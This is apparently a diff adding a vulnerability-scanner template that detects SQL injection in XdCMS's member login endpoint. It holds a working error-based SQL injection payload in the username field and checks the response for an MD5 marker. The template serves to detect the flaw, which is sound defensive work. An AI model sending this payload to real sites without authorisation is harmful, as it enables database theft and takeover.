@@ -1,0 +1,39 @@
+http:
+    - body: |
+        username=dd' or extractvalue(0x0a,concat(0x0a,md5({{num}})))#&password=dd&submit=+%B5%C7+%C2%BC+
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      matchers:
+        - part: header
+          type: word
+          words:
+            - 'Content-Type: text/html'
+        - part: body
+          type: word
+          words:
+            - '{{md5({{num}})}}'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: POST
+      path:
+        - '{{BaseURL}}/index.php?m=member&f=login_save'
+id: xdcms-sqli
+info:
+    author: pikpikcu
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-89
+    description: XdCMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+    metadata:
+        max-request: 1
+    name: XdCMS - SQL Injection
+    reference:
+        - https://www.uedbox.com/post/35188/
+    severity: critical
+    tags:
+        - xdcms
+variables:
+    num: "999999999"
